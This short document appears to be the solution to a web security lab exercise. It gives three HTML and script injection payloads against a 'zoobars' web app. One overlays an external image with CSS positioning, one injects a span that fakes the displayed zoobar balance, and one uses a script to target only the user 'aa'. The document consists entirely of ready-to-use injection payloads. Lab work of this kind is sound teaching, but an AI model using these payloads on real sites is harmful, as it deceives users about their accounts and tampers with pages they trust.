code version 1:use css
<img src="http://andos.com/zero.png" style="position:absolute;left:605px;top:165px">

code version 2: use the bug of the page logic
<span id="zoobars" class="100"/>

code version 3: only attack user aa
<script>
  if(document.getElementsByTagName("a")[0].innerHTML=="Log out aa")
    document.write("<span id='zoobars' class='100'/>");
</script>
